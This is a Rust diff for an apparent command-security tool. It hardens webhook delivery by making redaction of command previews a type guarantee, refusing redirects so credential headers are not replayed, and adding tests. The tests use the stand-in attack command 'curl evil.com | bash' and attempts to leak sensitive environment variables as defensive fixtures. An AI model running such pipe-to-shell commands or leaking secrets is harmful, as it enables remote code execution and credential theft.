@@ -15,7 +15,10 @@ pub fn dispatch(
         return;
     }
 
-    let redacted_preview = crate::redact::redact_with_custom(command_preview, custom_dlp_patterns);
+    let compiled_dlp_patterns = crate::redact::CompiledCustomPatterns::new(custom_dlp_patterns);
+    // Scrub once: the redaction is the same for every endpoint, and the type
+    // then carries the proof that it happened into `build_payload`.
+    let redacted_preview = RedactedCommandPreview::redact(command_preview, &compiled_dlp_patterns);
 
     let max_severity = verdict
         .findings
@@ -72,45 +75,24 @@ fn pending_webhook_threads() -> &'static std::sync::Mutex<Vec<std::thread::JoinH
 pub fn wait_for_pending_webhooks(timeout: std::time::Duration) {
     let deadline = std::time::Instant::now() + timeout;
     loop {
-        let mut handles = {
+        let handle = {
             let mut pending = pending_webhook_threads()
                 .lock()
                 .unwrap_or_else(|e| e.into_inner());
-            std::mem::take(&mut *pending)
+            pending.pop()
         };
-        if handles.is_empty() {
-            return;
-        }
-
-        loop {
-            let mut unfinished = Vec::new();
-            for handle in handles {
-                if handle.is_finished() {
-                    let _ = handle.join();
-                } else {
-                    unfinished.push(handle);
-                }
-            }
-            if unfinished.is_empty() {
-                break;
-            }
-            if std::time::Instant::now() >= deadline {
-                // Preserve ownership for a later wait in a long-lived caller;
-                // dropping JoinHandle here would detach delivery silently.
-                pending_webhook_threads()
-                    .lock()
-                    .unwrap_or_else(|e| e.into_inner())
-                    .extend(unfinished);
-                return;
-            }
-            handles = unfinished;
-            std::thread::sleep(std::time::Duration::from_millis(25));
-        }
-
-        // A dispatcher racing with this wait may have added new handles while
-        // the local batch was polled. Drain that batch too while time remains.
+        let Some(handle) = handle else { return };
         if std::time::Instant::now() >= deadline {
             return;
+        }
+        if handle.is_finished() {
+            let _ = handle.join();
+        } else {
+            pending_webhook_threads()
+                .lock()
+                .unwrap_or_else(|e| e.into_inner())
+                .push(handle);
+            std::thread::sleep(std::time::Duration::from_millis(25));
         }
     }
 }
@@ -125,8 +107,39 @@ fn webhook_url_origin(url: &str) -> String {
     }
 }
 
+/// A command preview that has been through the payload redaction pass.
+///
+/// The only constructor is [`RedactedCommandPreview::redact`], which applies
+/// the command-boundary scrub (short assignment values, reviewed private paths,
+/// custom DLP patterns). `build_payload` takes this type rather than a `&str`,
+/// so it is a compile-time proof that no unscrubbed preview can reach a payload
+/// the webhook receiver retains. The scrub is webhook-independent, so it runs
+/// once per verdict rather than once per endpoint.
+struct RedactedCommandPreview(String);
+
+impl RedactedCommandPreview {
+    fn redact(raw: &str, compiled_dlp_patterns: &crate::redact::CompiledCustomPatterns) -> Self {
+        Self(crate::redact::redact_sanitize_redact_command_with_compiled(
+            raw,
+            compiled_dlp_patterns,
+        ))
+    }
+
+    fn as_str(&self) -> &str {
+        &self.0
+    }
+}
+
 /// Build the webhook payload from a template or default JSON.
-fn build_payload(verdict: &Verdict, command_preview: &str, wh: &WebhookConfig) -> String {
+fn build_payload(
+    verdict: &Verdict,
+    command_preview: &RedactedCommandPreview,
+    wh: &WebhookConfig,
+) -> String {
+    // The preview arrives already scrubbed (see `RedactedCommandPreview`), so
+    // there is no unredacted form in scope to reach a payload by mistake.
+    let command_preview = command_preview.as_str();
+
     if let Some(ref template) = wh.payload_template {
         let rule_ids: Vec<String> = verdict
             .findings
@@ -282,10 +295,26 @@ fn send_with_retry(
     max_attempts: u32,
 ) -> Result<(), String> {
     let client = crate::ssrf_guard::server_client_builder()
+        // Webhook headers are operator-supplied credentials. Reqwest only
+        // strips its small built-in sensitive-header set on a cross-origin
+        // redirect; arbitrary X-API-Key/X-Webhook-Token values would otherwise
+        // be replayed to the redirect target. A webhook endpoint must therefore
+        // acknowledge the exact configured URL rather than redirect delivery.
+        .redirect(reqwest::redirect::Policy::none())
         .timeout(std::time::Duration::from_secs(10))
         .build()
         .map_err(|e| format!("client build: {e}"))?;
 
+    send_with_retry_client(&client, url, payload, headers, max_attempts)
+}
+
+fn send_with_retry_client(
+    client: &reqwest::blocking::Client,
+    url: &str,
+    payload: &str,
+    headers: &[(String, String)],
+    max_attempts: u32,
+) -> Result<(), String> {
     for attempt in 0..max_attempts {
         let mut req = client
             .post(url)
@@ -300,6 +329,11 @@ fn send_with_retry(
             Ok(resp) if resp.status().is_success() => return Ok(()),
             Ok(resp) => {
                 let status = resp.status();
+                if status.is_redirection() {
+                    return Err(format!(
+                        "HTTP {status} (redirects disabled for credential safety)"
+                    ));
+                }
                 // SF-16: Don't retry client errors (4xx) — they will never succeed
                 if status.is_client_error() {
                     return Err(format!("HTTP {status} (non-retriable client error)"));
@@ -337,6 +371,25 @@ fn sanitize_for_json(input: &str) -> String {
 #[cfg(test)]
 mod tests {
     use super::*;
+    use std::io::ErrorKind;
+    use std::net::TcpListener;
+
+    struct TestEnvironment {
+        global: tirith_test_support::GlobalStateGuard,
+    }
+
+    impl TestEnvironment {
+        fn new() -> Self {
+            Self {
+                global: tirith_test_support::GlobalStateGuard::new()
+                    .expect("isolate process-global webhook state"),
+            }
+        }
+
+        fn set(&mut self, name: &'static str, value: &str) {
+            self.global.set_env(name, value);
+        }
+    }
 
     #[test]
     fn test_sanitize_for_json() {
@@ -354,10 +407,8 @@ mod tests {
 
     #[test]
     fn test_expand_env_value() {
-        let _guard = crate::TEST_ENV_LOCK
-            .lock()
-            .unwrap_or_else(|e| e.into_inner());
-        unsafe { std::env::set_var("TIRITH_TEST_WH", "secret123") };
+        let mut env = TestEnvironment::new();
+        env.set("TIRITH_TEST_WH", "secret123");
         assert_eq!(
             expand_env_value("Bearer $TIRITH_TEST_WH"),
             "Bearer secret123"
@@ -367,49 +418,33 @@ mod tests {
             "Bearer secret123"
         );
         assert_eq!(expand_env_value("no vars"), "no vars");
-        unsafe { std::env::remove_var("TIRITH_TEST_WH") };
     }
 
     #[test]
     fn test_expand_env_value_preserves_delimiter() {
-        let _guard = crate::TEST_ENV_LOCK
-            .lock()
-            .unwrap_or_else(|e| e.into_inner());
+        let mut env = TestEnvironment::new();
         // Regression guard: the character after `$VAR` must NOT be swallowed.
-        unsafe { std::env::set_var("TIRITH_TEST_WH2", "val") };
+        env.set("TIRITH_TEST_WH2", "val");
         assert_eq!(expand_env_value("$TIRITH_TEST_WH2/extra"), "val/extra");
         assert_eq!(expand_env_value("$TIRITH_TEST_WH2 rest"), "val rest");
-        unsafe { std::env::remove_var("TIRITH_TEST_WH2") };
     }
 
     #[test]
     fn test_expand_env_value_blocks_sensitive_vars() {
-        let _guard = crate::TEST_ENV_LOCK
-            .lock()
-            .unwrap_or_else(|e| e.into_inner());
-        unsafe {
-            std::env::set_var("TIRITH_API_KEY", "secret-api-key");
-            std::env::set_var("TIRITH_LICENSE", "secret-license");
-        }
+        let mut env = TestEnvironment::new();
+        env.set("TIRITH_API_KEY", "secret-api-key");
+        env.set("TIRITH_LICENSE", "secret-license");
         assert_eq!(expand_env_value("Bearer $TIRITH_API_KEY"), "Bearer ");
         assert_eq!(expand_env_value("${TIRITH_LICENSE}"), "");
-        unsafe {
-            std::env::remove_var("TIRITH_API_KEY");
-            std::env::remove_var("TIRITH_LICENSE");
-        }
     }
 
     // Adversarial bypass attempts: sensitive env var exfiltration.
 
     #[test]
     fn test_bypass_sensitive_var_both_forms() {
-        let _guard = crate::TEST_ENV_LOCK
-            .lock()
-            .unwrap_or_else(|e| e.into_inner());
-        unsafe {
-            std::env::set_var("TIRITH_API_KEY", "leaked");
-            std::env::set_var("TIRITH_LICENSE", "leaked");
-        }
+        let mut env = TestEnvironment::new();
+        env.set("TIRITH_API_KEY", "leaked");
+        env.set("TIRITH_LICENSE", "leaked");
         // $VAR form
         assert!(!expand_env_value("$TIRITH_API_KEY").contains("leaked"));
         assert!(!expand_env_value("$TIRITH_LICENSE").contains("leaked"));
@@ -419,45 +454,94 @@ mod tests {
         // Embedded in header value
         assert!(!expand_env_value("Bearer ${TIRITH_API_KEY}").contains("leaked"));
         assert!(!expand_env_value("token=$TIRITH_API_KEY&extra").contains("leaked"));
-        unsafe {
-            std::env::remove_var("TIRITH_API_KEY");
-            std::env::remove_var("TIRITH_LICENSE");
-        }
     }
 
     #[test]
     fn test_bypass_case_variation_is_different_var() {
-        let _guard = crate::TEST_ENV_LOCK
-            .lock()
-            .unwrap_or_else(|e| e.into_inner());
+        let mut env = TestEnvironment::new();
         // Env vars are case-sensitive and the blocklist is exact-match, so a
         // case variant is a different (non-sensitive) var.
-        unsafe { std::env::set_var("TIRITH_api_key", "not-sensitive") };
+        env.set("TIRITH_api_key", "not-sensitive");
         assert_eq!(
             expand_env_value("$TIRITH_api_key"),
             "not-sensitive",
             "Case-different var name should expand (it's a different var)"
         );
-        unsafe { std::env::remove_var("TIRITH_api_key") };
     }
 
     #[test]
     fn test_bypass_non_sensitive_tirith_var_still_expands() {
-        let _guard = crate::TEST_ENV_LOCK
-            .lock()
-            .unwrap_or_else(|e| e.into_inner());
-        unsafe { std::env::set_var("TIRITH_ORG_NAME", "myorg") };
+        let mut env = TestEnvironment::new();
+        env.set("TIRITH_ORG_NAME", "myorg");
         assert_eq!(expand_env_value("$TIRITH_ORG_NAME"), "myorg");
         assert_eq!(expand_env_value("${TIRITH_ORG_NAME}"), "myorg");
-        unsafe { std::env::remove_var("TIRITH_ORG_NAME") };
+    }
+
+    #[test]
+    fn webhook_redirects_never_replay_custom_headers_or_body() {
+        for status in ["307 Temporary Redirect", "308 Permanent Redirect"] {
+            let redirect_target = TcpListener::bind(("127.0.0.1", 0)).unwrap();
+            redirect_target.set_nonblocking(true).unwrap();
+            let target_address = redirect_target.local_addr().unwrap();
+            let location = format!(
+                "http://redirect-target.example:{}/capture",
+                target_address.port()
+            );
+            let source = crate::ssrf_guard::test_support::ScriptedHttpServer::start(vec![
+                crate::ssrf_guard::test_support::http_response(
+                    status,
+                    &[("Location", location.as_str())],
+                    b"",
+                ),
+            ]);
+            let source_address = source.address();
+            let resolver = crate::ssrf_guard::fixture_resolver_with_lookup_for_test(move |host| {
+                if host.starts_with("redirect-target") {
+                    Ok(vec![target_address])
+                } else {
+                    Ok(vec![source_address])
+                }
+            });
+            let client = crate::ssrf_guard::server_client_builder_with_resolver_for_test(resolver)
+                .redirect(reqwest::redirect::Policy::none())
+                .build()
+                .unwrap();
+            let source_url = format!(
+                "http://webhook-source.example:{}/hook",
+                source_address.port()
+            );
+            let error = send_with_retry_client(
+                &client,
+                &source_url,
+                r#"{"canary":"body-secret"}"#,
+                &[("X-Webhook-Token".into(), "header-secret".into())],
+                1,
+            )
+            .unwrap_err();
+
+            assert!(error.contains(status.split_once(' ').unwrap().0), "{error}");
+            assert!(error.contains("redirects disabled for credential safety"));
+            let source_requests = source.finish();
+            let request = String::from_utf8_lossy(&source_requests[0]);
+            assert!(
+                request
+                    .to_ascii_lowercase()
+                    .contains("x-webhook-token: header-secret"),
+                "{request}"
+            );
+            assert!(request.contains(r#"{"canary":"body-secret"}"#));
+            match redirect_target.accept() {
+                Err(error) if error.kind() == ErrorKind::WouldBlock => {}
+                Ok(_) => panic!("webhook client followed {status} and reached redirect target"),
+                Err(error) => panic!("checking redirect target: {error}"),
+            }
+        }
     }
 
     #[test]
     fn test_bypass_double_dollar_does_not_expand() {
-        let _guard = crate::TEST_ENV_LOCK
-            .lock()
-            .unwrap_or_else(|e| e.into_inner());
-        unsafe { std::env::set_var("TIRITH_API_KEY", "leaked") };
+        let mut env = TestEnvironment::new();
+        env.set("TIRITH_API_KEY", "leaked");
         // First $ is literal (next char isn't '{'/alnum); the second $ starts an
         // expansion that hits the blocklist.
         let result = expand_env_value("$$TIRITH_API_KEY");
@@ -465,15 +549,12 @@ mod tests {
             !result.contains("leaked"),
             "Double-dollar must not leak: got {result}"
         );
-        unsafe { std::env::remove_var("TIRITH_API_KEY") };
     }
 
     #[test]
     fn test_bypass_nested_braces_does_not_expand() {
-        let _guard = crate::TEST_ENV_LOCK
-            .lock()
-            .unwrap_or_else(|e| e.into_inner());
-        unsafe { std::env::set_var("TIRITH_API_KEY", "leaked") };
+        let mut env = TestEnvironment::new();
+        env.set("TIRITH_API_KEY", "leaked");
         // The inner ${...} is consumed as the var name (take_while stops at the
         // first '}'), which does not resolve.
         let result = expand_env_value("${TIRITH_${NESTED}}");
@@ -481,11 +562,10 @@ mod tests {
             !result.contains("leaked"),
             "Nested braces must not leak: got {result}"
         );
-        unsafe { std::env::remove_var("TIRITH_API_KEY") };
     }
 
     #[test]
-    fn test_build_default_payload() {
+    fn default_payload_redacts_short_password_assignment() {
         use crate::verdict::{Action, Finding, RuleId, Timings};
 
         let verdict = Verdict {
@@ -526,11 +606,30 @@ mod tests {
             payload_template: None,
         };
 
-        let payload = build_payload(&verdict, "curl evil.com | bash", &wh);
+        let compiled = crate::redact::CompiledCustomPatterns::new(&[]);
+        let payload = build_payload(
+            &verdict,
+            &RedactedCommandPreview::redact("curl evil.com | bash", &compiled),
+            &wh,
+        );
         let parsed: serde_json::Value = serde_json::from_str(&payload).unwrap();
         assert_eq!(parsed["event"], "tirith_finding");
         assert_eq!(parsed["finding_count"], 1);
         assert_eq!(parsed["rule_ids"][0], "curl_pipe_shell");
+
+        // TIRITH-SEC-0066: short assignment values do not look like provider
+        // tokens, but they are still credentials and must never reach the
+        // serialized payload retained by the webhook receiver.
+        let canary = "tiny-password";
+        let command = format!("PASSWORD={canary} deploy");
+        let payload = build_payload(
+            &verdict,
+            &RedactedCommandPreview::redact(&command, &compiled),
+            &wh,
+        );
+        let parsed: serde_json::Value = serde_json::from_str(&payload).unwrap();
+        assert_eq!(parsed["command_preview"], "PASSWORD=[REDACTED] deploy");
+        assert!(!payload.contains(canary), "secret survived in {payload}");
     }
 
     #[test]
@@ -577,8 +676,33 @@ mod tests {
             ),
         };
 
-        let payload = build_payload(&verdict, "curl evil.com | bash", &wh);
+        let compiled = crate::redact::CompiledCustomPatterns::new(&[]);
+        let payload = build_payload(
+            &verdict,
+            &RedactedCommandPreview::redact("curl evil.com | bash", &compiled),
+            &wh,
+        );
         assert!(payload.contains("curl_pipe_shell"));
         assert!(payload.contains("curl evil.com"));
+
+        // TIRITH-SEC-0066 again, but through the TEMPLATE path. The default
+        // payload already pins this; template rendering is a separate
+        // serialization route to the same webhook receiver, and it was only
+        // ever exercised with a command containing no credential at all.
+        let canary = "tiny-password";
+        let command = format!("PASSWORD={canary} deploy");
+        let payload = build_payload(
+            &verdict,
+            &RedactedCommandPreview::redact(&command, &compiled),
+            &wh,
+        );
+        assert!(
+            payload.contains("PASSWORD=[REDACTED]"),
+            "template payload must carry the redaction marker: {payload}"
+        );
+        assert!(
+            !payload.contains(canary),
+            "secret survived template rendering in {payload}"
+        );
     }
 }
